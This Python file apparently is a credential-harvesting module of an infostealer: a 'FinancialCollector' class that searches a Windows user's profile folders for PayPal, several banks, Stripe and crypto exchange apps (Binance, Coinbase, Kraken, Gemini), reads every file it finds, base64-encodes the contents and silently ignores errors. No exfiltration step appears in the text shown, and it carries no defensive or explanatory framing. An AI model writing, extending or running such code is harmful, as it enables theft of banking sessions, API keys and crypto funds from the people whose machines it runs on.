import os
import json
import base64

class FinancialCollector:
    def __init__(self):
        self.data = {}
        
    def collect_banking_apps(self):
        banking_apps = {
            'paypal': os.path.join(os.environ.get('APPDATA', ''), 'PayPal'),
            'chase': os.path.join(os.environ.get('APPDATA', ''), 'Chase'),
            'wells_fargo': os.path.join(os.environ.get('APPDATA', ''), 'Wells Fargo'),
            'boa': os.path.join(os.environ.get('APPDATA', ''), 'Bank of America'),
        }
        
        banking_data = {}
        for app, path in banking_apps.items():
            if os.path.exists(path):
                banking_data[app] = self._collect_from_directory(path)
                
        return banking_data
        
    def collect_paypal_tokens(self):
        paypal_paths = [
            os.path.join(os.environ.get('APPDATA', ''), 'PayPal'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'PayPal'),
        ]
        
        tokens = {}
        for path in paypal_paths:
            if os.path.exists(path):
                tokens[path] = self._collect_from_directory(path)
                
        return tokens
        
    def collect_stripe_keys(self):
        stripe_paths = []
        
        search_paths = [
            os.environ.get('APPDATA', ''),
            os.environ.get('USERPROFILE', ''),
        ]
        
        for base_path in search_paths:
            for root, dirs, files in os.walk(base_path):
                if 'stripe' in root.lower():
                    stripe_paths.append(root)
                    
        stripe_keys = {}
        for path in stripe_paths[:5]:
            stripe_keys[path] = self._collect_from_directory(path)
            
        return stripe_keys
        
    def collect_crypto_exchanges(self):
        exchanges = {
            'binance': os.path.join(os.environ.get('APPDATA', ''), 'Binance'),
            'coinbase': os.path.join(os.environ.get('APPDATA', ''), 'Coinbase'),
            'kraken': os.path.join(os.environ.get('APPDATA', ''), 'Kraken'),
            'gemini': os.path.join(os.environ.get('APPDATA', ''), 'Gemini'),
        }
        
        exchange_data = {}
        for exchange, path in exchanges.items():
            if os.path.exists(path):
                exchange_data[exchange] = self._collect_from_directory(path)
                
        return exchange_data
        
    def _collect_from_directory(self, path):
        data = {}
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        data[file] = self._read_file(file_path)
                    except:
                        pass
        except:
            pass
        return data
        
    def _read_file(self, path):
        try:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except:
            return b''
